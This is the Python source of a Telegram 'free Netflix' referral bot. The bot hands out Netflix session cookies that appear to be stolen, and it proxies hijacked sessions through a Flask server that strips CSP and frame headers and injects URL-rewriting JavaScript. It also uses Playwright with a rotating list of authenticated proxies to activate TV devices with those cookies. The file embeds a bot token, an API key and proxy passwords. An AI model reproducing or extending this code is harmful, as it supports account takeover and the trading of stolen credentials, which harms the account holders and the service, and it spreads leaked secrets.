import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
import requests
import sqlite3
import threading
import json as _json
import asyncio
import tempfile
import os
import logging
import zipfile
import io
import uuid
import time
from queue import Queue
from urllib.parse import quote, unquote
from flask import Flask, request as flask_request, Response, redirect
from concurrent.futures import ThreadPoolExecutor
from playwright.async_api import async_playwright

logging.basicConfig(level=logging.ERROR)
logger = logging.getLogger(__name__)

# ==========================================
# CONFIGURATION
# ==========================================
TELEGRAM_BOT_TOKEN = "8714178001:AAGownpdpr5lY-EJpAwI_B591Hm9jPui06Y"
NFTOKEN_API_KEY    = "NFK_dda3ee3932171d33d94067e3"
API_URL            = "https://nftoken.site/v1/api.php"
# Default fallback URL
_DEFAULT_URL = "https://caps-cartridge-dis-lightbox.trycloudflare.com"

def get_public_url():
    """Dynamically retrieves the public URL from DB, Env, or Fallback."""
    with db() as c:
        r = c.execute("SELECT value FROM _meta WHERE key='public_url'").fetchone()
        if r and r[0]:
            return r[0].rstrip("/")
    return os.environ.get("PUBLIC_URL", _DEFAULT_URL).rstrip("/")

def set_public_url(url):
    """Saves a new public URL to the database."""
    url = url.strip().rstrip("/")
    if not url.startswith("http"):
        return False
    with db() as c:
        c.execute("INSERT OR REPLACE INTO _meta(key,value)VALUES('public_url',?)", (url,))
        c.commit()
    return True

MUST_JOIN_CHANNELS = [
    {"name": "Channel 1", "url": "https://t.me/netflixgiveawayx",  "id": "@netflixgiveawayx"},
    {"name": "Channel 2", "url": "https://t.me/zwdxmoneymax",      "id": "@zwdxmoneymax"},
]

STOCK_CHANNEL_ID  = int(os.environ.get("STOCK_CHANNEL_ID",  "-1003755778558"))
PUBLIC_CHANNEL_ID = int(os.environ.get("PUBLIC_CHANNEL_ID", "-1003870302189"))
ADMIN_IDS         = {int(x) for x in os.environ.get("ADMIN_IDS", "2077116559").split(",")}
SUPPORT_USERNAME  = os.environ.get("SUPPORT_USERNAME", "@netflixgiveawayx")

_BUILTIN_PROMOS = {"VEDVIT": 1000000, "VEDVITOP": 1, "TV": 2}

DEVICES = {
    "mobile": {"label": "📱 Mobile", "cost": 2},
    "pc":     {"label": "💻 PC",     "cost": 2},
    "tv":     {"label": "📺 TV",     "cost": 3},
}

DB_PATH  = os.environ.get("DB_PATH", "cookie5.db")
HEADLESS = True

TV_URL         = "https://www.netflix.com/tv9"
CODE_SELECTOR  = "input[data-uia='input-text-with-label']"
CODE_FALLBACKS = [
    "input[autocomplete='one-time-code']", "input[name='code']",
    "input[maxlength='8']", "input[maxlength='1']",
    "input[type='tel']", "input[type='text']",
    "[data-uia='pin-input-field'] input", ".pin-input input",
]
SUBMIT_SELECTOR  = "button[data-uia='sign-in-form-submit-btn']"
SUBMIT_FALLBACKS = [
    "button[type='submit']", "button[data-uia='action-btn']",
    "[data-uia='login-submit-button']", "button:has-text('Continue')",
    "button:has-text('Next')",
]

_pending_tv: dict = {}

# ==========================================
# THREAD POOL
# ==========================================
_executor = ThreadPoolExecutor(max_workers=8)

def run_bg(fn, *args, **kwargs):
    return _executor.submit(fn, *args, **kwargs)

# ==========================================
# SAFE SEND
# ==========================================
_FATAL_ERRORS = (
    "bot was blocked", "user is deactivated", "chat not found",
    "not enough rights", "bot is not a member", "have no rights",
    "forbidden", "kicked", "deactivated",
)

def _is_fatal(e):
    return any(x in str(e).lower() for x in _FATAL_ERRORS)

def safe_send(fn, *args, **kwargs):
    try:
        return fn(*args, **kwargs)
    except Exception as e:
        if not _is_fatal(e):
            logger.warning(f"[SEND_ERR] {e}")
        return None

def safe_msg(chat_id, text, **kw):
    return safe_send(bot.send_message, chat_id, text, **kw)

def safe_edit(text, chat_id, msg_id, **kw):
    try:
        return bot.edit_message_text(text, chat_id, msg_id, **kw)
    except Exception:
        return None

# ==========================================
# FLASK PROXY
# ==========================================
DESKTOP_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/124.0.0.0 Safari/537.36"
)
NETFLIX_BASE = "https://www.netflix.com"
_SKIP_HDR    = frozenset({
    "content-security-policy", "x-frame-options",
    "content-encoding", "transfer-encoding",
    "strict-transport-security", "x-content-type-options",
})

_proxy_sessions: dict = {}
_sessions_lock        = threading.Lock()
_SESSION_TTL          = 7200

_http = requests.Session()
_adp  = requests.adapters.HTTPAdapter(pool_connections=30, pool_maxsize=60, max_retries=1)
_http.mount("https://", _adp)
_http.mount("http://",  _adp)

def _clean_sessions():
    now = time.time()
    with _sessions_lock:
        for k in [k for k, v in _proxy_sessions.items() if now - v["ts"] > _SESSION_TTL]:
            del _proxy_sessions[k]

def _pbase(sid):
    return f"{get_public_url()}/nf/{sid}"

def _desktop_headers():
    """Always returns headers that make Netflix think it's talking to a desktop Chrome."""
    return {
        "User-Agent":                DESKTOP_UA,
        "Accept-Language":           "en-US,en;q=0.9",
        "Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Sec-CH-UA":                 '"Chromium";v="124", "Google Chrome";v="124"',
        "Sec-CH-UA-Mobile":          "?0",
        "Sec-CH-UA-Platform":        '"Windows"',
        "Upgrade-Insecure-Requests": "1",
    }

def _rewrite(html, sid):
    b = _pbase(sid)
    for old in [
        "https://www.netflix.com", "http://www.netflix.com",
        "//www.netflix.com",
        r"https:\/\/www.netflix.com", r"http:\/\/www.netflix.com",
    ]:
        html = html.replace(old, b)

    js = f"""<script>
(function(){{
  var P={_json.dumps(b)},N="https://www.netflix.com";
  function r(u){{
    if(!u||typeof u!=="string")return u;
    if(u.startsWith(N))return P+u.slice(N.length);
    if(u.startsWith("//www.netflix.com"))return P+u.slice(18);
    if(u.startsWith("/")&&!u.startsWith("//"))return P+u;
    return u;
  }}
  history.pushState=(function(o){{return function(s,t,u){{return o(s,t,r(u));}}}})(history.pushState.bind(history));
  history.replaceState=(function(o){{return function(s,t,u){{return o(s,t,r(u));}}}})(history.replaceState.bind(history));
  location.assign=(function(a){{return function(u){{a(r(u));}}}})(location.assign.bind(location));
  location.replace=(function(a){{return function(u){{a(r(u));}}}})(location.replace.bind(location));
  var oF=window.fetch;
  window.fetch=function(i,o){{
    if(typeof i==="string")i=r(i);
    else if(i&&i.url)i=new Request(r(i.url),i);
    return oF(i,o);
  }};
  var oO=XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open=function(m,u){{
    arguments[1]=r(u);return oO.apply(this,arguments);
  }};
  document.addEventListener("click",function(e){{
    var a=e.target.closest("a");if(!a)return;
    var h=a.getAttribute("href");if(!h)return;
    var rw=r(h);
    if(rw!==h){{e.preventDefault();location.href=rw;}}
  }},true);
  window.open=(function(o){{return function(u,n,f){{return o(r(u),n,f);}}}})( window.open.bind(window));

  // Auto-switch to mobile mode when interactive
  function switchToMobile() {{
    var vp = document.getElementById('viewport-meta');
    if (vp) {{
      vp.setAttribute('content', 'width=device-width, initial-scale=1, maximum-scale=1');
    }}
    var st = document.getElementById('forced-desktop-style');
    if (st) st.remove();
    console.log("Netflix interactive: Switched to mobile viewport");
  }}

  // Netflix specific check for interactivity
  var checkInterval = setInterval(function() {{
    if (document.querySelector('.watch-video') || 
        document.querySelector('.browse-navigation') || 
        document.querySelector('.profile-gate-label') ||
        document.querySelector('.main-view')) {{
      clearInterval(checkInterval);
      switchToMobile();
    }}
  }}, 500);

  window.addEventListener('load', function() {{
    setTimeout(switchToMobile, 5000); // Fallback after 5s
  }});
}})();
</script>"""

    # Force desktop layout: width=1280 makes mobile Chrome render desktop site
    tag = (
        f'<base href="{b}/">'
        f'<meta id="viewport-meta" name="viewport" content="width=1280">'
        f'<style id="forced-desktop-style">html,body{{min-width:1280px!important;overflow-x:auto!important;}}</style>'
        f'{js}'
    )
    if "<head>" in html:
        return html.replace("<head>", "<head>\n" + tag, 1)
    if "<html>" in html:
        return html.replace("<html>", "<html>\n" + tag, 1)
    return tag + html


flask_app = Flask(__name__)


@flask_app.route("/go")
def go_proxy():
    """
    Entry point for mobile users.
    1. Follows the x_l1 login link server-side (desktop UA) → captures auth cookies.
    2. Fetches /browse with those cookies → gets the desktop HTML.
    3. Rewrites URLs and serves it with forced desktop viewport.
    """
    _clean_sessions()
    target = unquote(flask_request.args.get("url", ""))
    if not target.startswith("https://"):
        return "Bad URL", 400

    try:
        s = requests.Session()
        s.headers.update(_desktop_headers())

        # Step 1: follow the one-time login link — sets auth cookies in session
        s.get(target, allow_redirects=True, timeout=20)

        # Step 2: fetch the browse page as a desktop browser
        resp = s.get(f"{NETFLIX_BASE}/browse", allow_redirects=True, timeout=20)

        sid = str(uuid.uuid4())
        with _sessions_lock:
            _proxy_sessions[sid] = {"sess": s, "ts": time.time()}

        r = Response(
            _rewrite(resp.text, sid),
            200,
            content_type="text/html; charset=utf-8",
        )
        r.headers["Cache-Control"]         = "no-store"
        r.headers["X-Frame-Options"]       = ""
        r.headers["Content-Security-Policy"] = ""
        return r

    except Exception as e:
        return f"<h2>Error</h2><pre>{e}</pre>", 500


@flask_app.route("/nf/<sid>/",           defaults={"p": ""}, methods=["GET","POST","PUT","PATCH","DELETE","OPTIONS","HEAD"])
@flask_app.route("/nf/<sid>/<path:p>",                       methods=["GET","POST","PUT","PATCH","DELETE","OPTIONS","HEAD"])
def nf_proxy(sid, p):
    if flask_request.method == "OPTIONS":
        r = Response("", 204)
        r.headers.update({
            "Access-Control-Allow-Origin":  "*",
            "Access-Control-Allow-Headers": "*",
            "Access-Control-Allow-Methods": "GET,POST,PUT,PATCH,DELETE,OPTIONS,HEAD",
        })
        return r

    with _sessions_lock:
        sess_data = _proxy_sessions.get(sid)
    if not sess_data:
        return (
            "<h3 style='color:#e50914;font-family:sans-serif'>"
            "Session expired — get a new link from the bot.</h3>"
        ), 404

    sess_data["ts"] = time.time()
    sess: requests.Session = sess_data["sess"]

    target = f"{NETFLIX_BASE}/{p}"
    qs = flask_request.query_string.decode()
    if qs:
        target += f"?{qs}"

    body = flask_request.get_data() if flask_request.method in ("POST", "PUT", "PATCH") else None

    # Always use desktop headers — never let the mobile browser's UA leak through
    hdrs = _desktop_headers()
    ct = flask_request.headers.get("Content-Type")
    if ct:
        hdrs["Content-Type"] = ct
    for k, v in flask_request.headers:
        if k.lower().startswith("x-netflix"):
            hdrs[k] = v

    try:
        resp = sess.request(
            flask_request.method, target,
            headers=hdrs, data=body,
            allow_redirects=False, timeout=25, stream=True,
        )

        if resp.status_code in (301, 302, 303, 307, 308):
            loc = resp.headers.get("Location", "")
            if loc.startswith(NETFLIX_BASE):
                loc = loc.replace(NETFLIX_BASE, _pbase(sid))
            elif loc.startswith("/"):
                loc = _pbase(sid) + loc
            return redirect(loc, code=resp.status_code)

        ctype = resp.headers.get("Content-Type", "application/octet-stream")

        # Build clean response headers (strip security headers that break rendering)
        out_hdrs = {
            k: v for k, v in resp.headers.items()
            if k.lower() not in _SKIP_HDR
        }
        out_hdrs["Access-Control-Allow-Origin"]  = "*"
        out_hdrs["X-Frame-Options"]              = ""
        out_hdrs["Content-Security-Policy"]      = ""

        if "text/html" in ctype:
            return Response(
                _rewrite(resp.text, sid),
                resp.status_code,
                content_type="text/html; charset=utf-8",
                headers={k: v for k, v in out_hdrs.items() if k.lower() != "content-type"},
            )
        elif any(t in ctype for t in ("javascript", "text/css", "text/plain")):
            txt = (
                resp.text
                .replace(NETFLIX_BASE, _pbase(sid))
                .replace(r"https:\/\/www.netflix.com", _pbase(sid))
            )
            return Response(txt, resp.status_code, content_type=ctype, headers=out_hdrs)
        elif "json" in ctype:
            return Response(resp.content, resp.status_code, content_type=ctype, headers=out_hdrs)
        else:
            return Response(
                resp.iter_content(65536), resp.status_code,
                headers=out_hdrs, content_type=ctype, direct_passthrough=True,
            )

    except Exception as e:
        return f"Proxy error: {e}", 502


@flask_app.route("/health")
def health():
    return "OK", 200


def run_flask():
    try:
        from waitress import serve
        print("[FLASK] Waitress WSGI — production ready")
        serve(flask_app, host="0.0.0.0", port=8080, threads=16, channel_timeout=60)
    except ImportError:
        flask_app.run(host="0.0.0.0", port=8080, debug=False, use_reloader=False, threaded=True)


# ==========================================
# PROXY ROTATION (TV only)
# ==========================================
_RAW_PROXIES = [
    "31.59.20.176:6754:sunyxylf:jcpmdb5nd5tu",
    "23.95.150.145:6114:sunyxylf:jcpmdb5nd5tu",
    "198.23.239.134:6540:sunyxylf:jcpmdb5nd5tu",
    "45.38.107.97:6014:sunyxylf:jcpmdb5nd5tu",
    "107.172.163.27:6543:sunyxylf:jcpmdb5nd5tu",
    "198.105.121.200:6462:sunyxylf:jcpmdb5nd5tu",
    "216.10.27.159:6837:sunyxylf:jcpmdb5nd5tu",
    "142.111.67.146:5611:sunyxylf:jcpmdb5nd5tu",
    "191.96.254.138:6185:sunyxylf:jcpmdb5nd5tu",
    "31.58.9.4:6077:sunyxylf:jcpmdb5nd5tu",
]

def _pp(raw):
    try:
        ip, port, u, pw = raw.strip().split(":")
        return {"server": f"http://{ip}:{port}", "username": u, "password": pw}
    except:
        return None

_PROXY_LIST  = [p for r in _RAW_PROXIES if (p := _pp(r))]
_proxy_lock  = threading.Lock()
_proxy_idx   = 0
_dead_proxies: set = set()

def _next_proxy():
    global _proxy_idx
    with _proxy_lock:
        n = len(_PROXY_LIST)
        for _ in range(n):
            p = _PROXY_LIST[_proxy_idx % n]
            _proxy_idx = (_proxy_idx + 1) % n
            if p["server"] not in _dead_proxies:
                return p
    return None

def _kill_proxy(p):
    if p:
        _dead_proxies.add(p["server"])
        print(f"[PROXY] Dead: {p['server']}")

# ==========================================
# COOKIE PARSER
# ==========================================
def _is_cookie(text):
    t = text.lower()
    return (
        "netflix" in t
        or "netflixid" in t.replace(" ", "")
        or "securenetflixid" in t.replace(" ", "")
        or (text.strip().startswith("[") and "netflix" in t)
    )

def parse_cookies(raw):
    raw   = raw.strip()
    clean = "\n".join(l for l in raw.splitlines() if not l.strip().startswith("#") and l.strip())
    if clean.startswith("["):
        try:
            cs = _json.loads(clean)
            if isinstance(cs, list):
                out = []
                for c in cs:
                    nm = c.get("name") or c.get("Name", "")
                    if not nm:
                        continue
                    dom = c.get("domain", ".netflix.com") or ".netflix.com"
                    if dom and not dom.startswith(".") and not dom.startswith("http"):
                        dom = "." + dom
                    e = {
                        "name":   str(nm).strip(),
                        "value":  str(c.get("value") or c.get("Value", "")).strip(),
                        "domain": dom.strip(),
                        "path":   (c.get("path") or "/").strip() or "/",
                    }
                    exp = c.get("expires") or c.get("expirationDate") or c.get("expiration")
                    if exp:
                        try:
                            v = float(exp)
                            if v > 4_102_444_800: v /= 1000
                            if 0 < v <= 4_102_444_800: e["expires"] = v
                        except:
                            pass
                    if "httpOnly" in c: e["httpOnly"] = bool(c["httpOnly"])
                    if "secure"   in c: e["secure"]   = bool(c["secure"])
                    ss = c.get("sameSite") or c.get("samesite", "")
                    if ss in ("Strict", "Lax", "None"): e["sameSite"] = ss
                    out.append(e)
                if out:
                    return out
        except:
            pass
    ns = []
    for line in raw.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        cols = line.split("\t")
        if len(cols) < 7:
            continue
        dom, _, path, sec, exp, nm, val = cols[:7]
        dom = dom.strip()
        if not dom:
            continue
        if not dom.startswith(".") and not dom.startswith("http"):
            dom = "." + dom
        e = {
            "name":   nm.strip(),
            "value":  val.strip(),
            "domain": dom,
            "path":   path.strip() or "/",
            "secure": sec.strip().upper() == "TRUE",
        }
        try:
            v = float(exp.strip())
            if v > 4_102_444_800: v /= 1000
            if 0 < v <= 4_102_444_800: e["expires"] = v
        except:
            pass
        ns.append(e)
    if ns:
        return ns
    out = []
    for ch in raw.replace("\n", ";").replace("|", ";").split(";"):
        ch = ch.strip()
        if "=" not in ch:
            continue
        n, _, v = ch.partition("=")
        n = n.strip()
        if not n or n.startswith("#"):
            continue
        out.append({"name": n, "value": v.strip(), "domain": ".netflix.com", "path": "/"})
    return out

# ==========================================
# PLAYWRIGHT TV
# ==========================================
async def _tv_async(cookie_raw, code, proxy):
    cookies = parse_cookies(cookie_raw)
    if not cookies:
        raise ValueError("No valid cookies.")
    sc = tempfile.mktemp(suffix=".png")
    kw = {
        "headless": HEADLESS,
        "args": ["--no-sandbox", "--disable-dev-shm-usage",
                 "--disable-gpu", "--disable-extensions", "--no-first-run"],
    }
    if proxy:
        kw["proxy"] = proxy
    async with async_playwright() as pw:
        br  = await pw.chromium.launch(**kw)
        ctx = await br.new_context(
            viewport={"width": 1280, "height": 800},
            user_agent=DESKTOP_UA,
            ignore_https_errors=True,
        )
        await ctx.route(
            "**/*.{png,jpg,jpeg,gif,svg,ico,woff,woff2,ttf,mp4,webm}",
            lambda r: r.abort(),
        )
        pg = await ctx.new_page()
        try:
            for c in cookies:
                try:
                    await ctx.add_cookies([c])
                except:
                    pass
            await pg.goto(TV_URL, wait_until="domcontentloaded", timeout=30000)
            matched = None
            for sel in [CODE_SELECTOR] + CODE_FALLBACKS:
                try:
                    await pg.wait_for_selector(sel, state="visible", timeout=5000)
                    matched = sel
                    break
                except:
                    continue
            if not matched:
                await pg.screenshot(path=sc, full_page=False)
                return False, sc
            inputs = await pg.query_selector_all(matched)
            if len(inputs) > 1:
                for i, d in enumerate(code):
                    if i < len(inputs):
                        await inputs[i].click()
                        await inputs[i].fill(d)
                        await pg.wait_for_timeout(80)
            else:
                await pg.fill(matched, "")
                await pg.type(matched, code, delay=60)
            done = False
            for sel in [SUBMIT_SELECTOR] + SUBMIT_FALLBACKS:
                try:
                    await pg.wait_for_selector(sel, state="visible", timeout=4000)
                    await pg.click(sel)
                    done = True
                    break
                except:
                    continue
            if not done:
                await pg.press(matched, "Enter")
            try:
                await pg.wait_for_load_state("domcontentloaded", timeout=12000)
            except:
                pass
            await pg.screenshot(path=sc, full_page=False)
            return True, sc
        finally:
            await ctx.close()
            await br.close()

def tv_activate(cookie_raw, code, proxy):
    loop = asyncio.new_event_loop()
    try:
        return loop.run_until_complete(_tv_async(cookie_raw, code, proxy))
    finally:
        loop.close()

# ==========================================
# DATABASE POOL
# ==========================================
_db_pool = Queue(maxsize=12)

def _mkconn():
    c = sqlite3.connect(DB_PATH, check_same_thread=False, timeout=10)
    c.execute("PRAGMA journal_mode=WAL")
    c.execute("PRAGMA synchronous=NORMAL")
    c.execute("PRAGMA cache_size=-32000")
    c.execute("PRAGMA temp_store=MEMORY")
    c.execute("PRAGMA foreign_keys=ON")
    return c

class _DB:
    def __enter__(self):
        try:
            self.c = _db_pool.get(timeout=5)
        except:
            self.c = _mkconn()
        return self.c
    def __exit__(self, *_):
        try:
            _db_pool.put_nowait(self.c)
        except:
            self.c.close()

def db():
    return _DB()

def init_db():
    for _ in range(10):
        _db_pool.put(_mkconn())
    with db() as c:
        c.executescript("""
            CREATE TABLE IF NOT EXISTS users(uid INTEGER PRIMARY KEY,points INTEGER NOT NULL DEFAULT 0,joined INTEGER NOT NULL DEFAULT 0);
            CREATE TABLE IF NOT EXISTS referrals(referrer_uid INTEGER NOT NULL,referred_uid INTEGER NOT NULL,PRIMARY KEY(referrer_uid,referred_uid));
            CREATE TABLE IF NOT EXISTS pending_refs(new_uid INTEGER PRIMARY KEY,referrer_uid INTEGER NOT NULL);
            CREATE TABLE IF NOT EXISTS stock(id INTEGER PRIMARY KEY AUTOINCREMENT,cookie TEXT NOT NULL,msg_id INTEGER DEFAULT NULL);
            CREATE TABLE IF NOT EXISTS used_cookies(id INTEGER PRIMARY KEY AUTOINCREMENT,cookie TEXT NOT NULL);
            CREATE TABLE IF NOT EXISTS used_promos(uid INTEGER NOT NULL,code TEXT NOT NULL,PRIMARY KEY(uid,code));
            CREATE TABLE IF NOT EXISTS promo_codes(code TEXT PRIMARY KEY,points INTEGER NOT NULL);
            CREATE TABLE IF NOT EXISTS referral_penalties(referrer_uid INTEGER NOT NULL,referred_uid INTEGER NOT NULL,channel_id TEXT NOT NULL,PRIMARY KEY(referrer_uid,referred_uid,channel_id));
            CREATE TABLE IF NOT EXISTS _meta(key TEXT PRIMARY KEY,value TEXT);
        """)
        for code, pts in _BUILTIN_PROMOS.items():
            c.execute("INSERT OR IGNORE INTO promo_codes(code,points)VALUES(?,?)", (code, pts))
        c.execute("INSERT OR REPLACE INTO _meta(key,value)VALUES('schema_version','5')")
        c.commit()
    print("[DB] Ready (schema v5)")

# ==========================================
# DB HELPERS
# ==========================================
def _eu(uid):
    with db() as c:
        c.execute("INSERT OR IGNORE INTO users(uid)VALUES(?)", (uid,))
        c.commit()

def get_points(uid):
    _eu(uid)
    with db() as c:
        return (c.execute("SELECT points FROM users WHERE uid=?", (uid,)).fetchone() or (0,))[0]

def add_points(uid, n):
    _eu(uid)
    with db() as c:
        c.execute("UPDATE users SET points=points+? WHERE uid=?", (n, uid))
        c.commit()
        return (c.execute("SELECT points FROM users WHERE uid=?", (uid,)).fetchone() or (0,))[0]

def deduct_points(uid, n):
    _eu(uid)
    with db() as c:
        c.execute("UPDATE users SET points=MAX(0,points-?) WHERE uid=?", (n, uid))
        c.commit()
        return (c.execute("SELECT points FROM users WHERE uid=?", (uid,)).fetchone() or (0,))[0]

def get_refs(uid):
    with db() as c:
        return (c.execute("SELECT COUNT(*) FROM referrals WHERE referrer_uid=?", (uid,)).fetchone() or (0,))[0]

def add_referral(ref, new):
    try:
        with db() as c:
            c.execute("INSERT INTO referrals(referrer_uid,referred_uid)VALUES(?,?)", (ref, new))
            c.commit()
        return True
    except sqlite3.IntegrityError:
        return False

def get_referrer(uid):
    with db() as c:
        r = c.execute("SELECT referrer_uid FROM referrals WHERE referred_uid=?", (uid,)).fetchone()
    return r[0] if r else None

def has_penalty(r, u, ch):
    with db() as c:
        return c.execute(
            "SELECT 1 FROM referral_penalties WHERE referrer_uid=? AND referred_uid=? AND channel_id=?",
            (r, u, ch),
        ).fetchone() is not None

def add_penalty(r, u, ch):
    with db() as c:
        c.execute(
            "INSERT OR IGNORE INTO referral_penalties(referrer_uid,referred_uid,channel_id)VALUES(?,?,?)",
            (r, u, ch),
        )
        c.commit()

def remove_penalty(r, u, ch):
    with db() as c:
        c.execute(
            "DELETE FROM referral_penalties WHERE referrer_uid=? AND referred_uid=? AND channel_id=?",
            (r, u, ch),
        )
        c.commit()

def mark_joined(uid):
    _eu(uid)
    with db() as c:
        c.execute("UPDATE users SET joined=1 WHERE uid=?", (uid,))
        c.commit()

def has_joined(uid):
    _eu(uid)
    with db() as c:
        r = c.execute("SELECT joined FROM users WHERE uid=?", (uid,)).fetchone()
    return bool(r and r[0])

def set_pending(new, ref):
    with db() as c:
        c.execute("INSERT OR REPLACE INTO pending_refs(new_uid,referrer_uid)VALUES(?,?)", (new, ref))
        c.commit()

def pop_pending(new):
    with db() as c:
        r = c.execute("SELECT referrer_uid FROM pending_refs WHERE new_uid=?", (new,)).fetchone()
        if r:
            c.execute("DELETE FROM pending_refs WHERE new_uid=?", (new,))
            c.commit()
            return r[0]
    return None

def stock_count():
    with db() as c:
        return (c.execute("SELECT COUNT(*) FROM stock").fetchone() or (0,))[0]

def pop_cookie():
    with db() as c:
        r = c.execute("SELECT id,cookie,msg_id FROM stock ORDER BY id LIMIT 1").fetchone()
        if not r:
            return None
        sid, cookie, mid = r
        c.execute("DELETE FROM stock WHERE id=?", (sid,))
        c.execute("INSERT INTO used_cookies(cookie)VALUES(?)", (cookie,))
        c.commit()
    if mid:
        try:
            bot.delete_message(STOCK_CHANNEL_ID, mid)
        except:
            pass
    return cookie

def push_cookie(cookie, msg_id=None):
    with db() as c:
        c.execute("INSERT INTO stock(cookie,msg_id)VALUES(?,?)", (cookie.strip(), msg_id))
        c.commit()

def kill_cookie(cookie):
    with db() as c:
        c.execute("INSERT INTO used_cookies(cookie)VALUES(?)", (cookie,))
        c.commit()

def has_used_promo(uid, code):
    with db() as c:
        return c.execute(
            "SELECT 1 FROM used_promos WHERE uid=? AND code=?", (uid, code)
        ).fetchone() is not None

def mark_promo(uid, code):
    with db() as c:
        c.execute("INSERT OR IGNORE INTO used_promos(uid,code)VALUES(?,?)", (uid, code))
        c.commit()

def get_promo(code):
    with db() as c:
        r = c.execute("SELECT points FROM promo_codes WHERE code=?", (code,)).fetchone()
    return r[0] if r else None

def create_promo(code, pts):
    with db() as c:
        ex = c.execute("SELECT 1 FROM promo_codes WHERE code=?", (code,)).fetchone()
        c.execute("INSERT OR REPLACE INTO promo_codes(code,points)VALUES(?,?)", (code, pts))
        c.commit()
    return ex is None

# ==========================================
# BOT SETUP
# ==========================================
bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN, num_threads=16)
PINNED_MSG = {}

def update_pin():
    n   = stock_count()
    txt = (
        f"📦 *Live Netflix Stock*\n━━━━━━━━━━━━━━━━━━\n"
        f"✅ Available: `{n}` account{'s' if n != 1 else ''}\n"
        f"━━━━━━━━━━━━━━━━━━\nStart → /start"
    )
    mid = PINNED_MSG.get(PUBLIC_CHANNEL_ID)
    try:
        if mid:
            bot.edit_message_text(txt, PUBLIC_CHANNEL_ID, mid, parse_mode="Markdown")
        else:
            m = bot.send_message(PUBLIC_CHANNEL_ID, txt, parse_mode="Markdown")
            bot.pin_chat_message(PUBLIC_CHANNEL_ID, m.message_id, disable_notification=True)
            PINNED_MSG[PUBLIC_CHANNEL_ID] = m.message_id
    except:
        pass

def check_member(uid):
    bad = []
    for ch in MUST_JOIN_CHANNELS:
        try:
            m = bot.get_chat_member(ch["id"], uid)
            if m.status in ("left", "kicked", "banned"):
                bad.append(ch)
        except:
            bad.append(ch)
    return bad

def must_join_kb(bad):
    bad_ids = {c["id"] for c in bad}
    kb  = InlineKeyboardMarkup()
    row = []
    for ch in MUST_JOIN_CHANNELS:
        emoji = "🥀" if ch["id"] in bad_ids else "✅"
        row.append(InlineKeyboardButton(f"{emoji} {ch['name']}", url=ch["url"]))
        if len(row) == 2:
            kb.row(*row)
            row = []
    if row:
        kb.row(*row)
    kb.row(InlineKeyboardButton("☑️  VERIFY ACCESS", callback_data="verify_access"))
    return kb

_bot_info_cache = None
def get_bot_info():
    global _bot_info_cache
    if not _bot_info_cache:
        _bot_info_cache = bot.get_me()
    return _bot_info_cache

def menu_text(uid):
    try:
        u    = bot.get_chat(uid)
        name = u.first_name or u.username or str(uid)
    except:
        name = str(uid)
    pts  = get_points(uid)
    refs = get_refs(uid)
    link = f"https://t.me/{get_bot_info().username}?start=ref_{uid}"
    return (
        f"🎁 *WELCOME TO FREE NETFLIX BOT*\n\n💎 *REFER AND GET*\n{'─'*28}\n\n"
        f"👤 User: {name}\n🆔 UID: `{uid}`\n\n"
        f"💎 Balance: `{pts} pts`\n🤝 Referrals: `{refs}`\n\n"
        f"🔗 Invite Link:\n`{link}`\n\n{'─'*28}\n💵 _Earn more by inviting friends_"
    )

def menu_kb(uid):
    kb = InlineKeyboardMarkup()
    kb.row(InlineKeyboardButton("🎁  REDEEM", callback_data=f"open_redeem:{uid}"))
    kb.row(
        InlineKeyboardButton("📊  Invite & Earn", callback_data=f"invite_earn:{uid}"),
        InlineKeyboardButton("🎟  Promocode",     callback_data=f"promocode:{uid}"),
    )
    kb.row(InlineKeyboardButton("🆘  Support", url=f"https://t.me/{SUPPORT_USERNAME.lstrip('@')}"))
    return kb

def award_ref(uid, ref_id):
    if ref_id and ref_id != uid:
        if add_referral(ref_id, uid):
            pts = add_points(ref_id, 1)
            safe_msg(
                ref_id,
                f"🎉 Your friend joined! *+1 Credit!*\n💎 Balance: `{pts} pts`",
                parse_mode="Markdown",
            )

# ==========================================
# HANDLERS
# ==========================================

@bot.message_handler(commands=["start"])
def cmd_start(msg):
    uid   = msg.from_user.id
    parts = msg.text.strip().split()
    ref   = None
    if len(parts) > 1 and parts[1].startswith("ref_"):
        try:
            ref = int(parts[1].split("_")[1])
            if ref == uid:
                ref = None
        except:
            pass
    bad = check_member(uid)
    if bad:
        if ref:
            set_pending(uid, ref)
        safe_msg(
            msg.chat.id,
            "🚀 *PREMIUM ACCESS BOT*\n\nJoin all channels and click *Verify* to start.",
            parse_mode="Markdown",
            reply_markup=must_join_kb(bad),
        )
        return
    if not has_joined(uid):
        mark_joined(uid)
        award_ref(uid, pop_pending(uid) or ref)
    safe_msg(msg.chat.id, menu_text(uid), parse_mode="Markdown", reply_markup=menu_kb(uid))


@bot.callback_query_handler(func=lambda c: c.data == "verify_access")
def cb_verify(call):
    uid = call.from_user.id
    bad = check_member(uid)
    if bad:
        bot.answer_callback_query(call.id, "")
        try:
            bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=must_join_kb(bad))
        except:
            pass
        safe_msg(call.message.chat.id, "❌ *Verification Failed!*\nJoin all channels and try again.", parse_mode="Markdown")
        return
    bot.answer_callback_query(call.id, "✅ Verified!")
    if not has_joined(uid):
        mark_joined(uid)
        award_ref(uid, pop_pending(uid))
    try:
        bot.edit_message_text(menu_text(uid), call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=menu_kb(uid))
    except:
        safe_msg(call.message.chat.id, menu_text(uid), parse_mode="Markdown", reply_markup=menu_kb(uid))


@bot.callback_query_handler(func=lambda c: c.data.startswith("open_redeem:"))
def cb_open_redeem(call):
    uid = call.from_user.id
    pts = get_points(uid)
    cnt = stock_count()
    kb  = InlineKeyboardMarkup()
    kb.row(
        InlineKeyboardButton("📱 Mobile  2pts", callback_data=f"redeem:mobile:{uid}"),
        InlineKeyboardButton("💻 PC  2pts",     callback_data=f"redeem:pc:{uid}"),
        InlineKeyboardButton("📺 TV  3pts",     callback_data=f"redeem:tv:{uid}"),
    )
    kb.row(InlineKeyboardButton("🔙 Back", callback_data=f"back_menu:{uid}"))
    try:
        bot.edit_message_text(
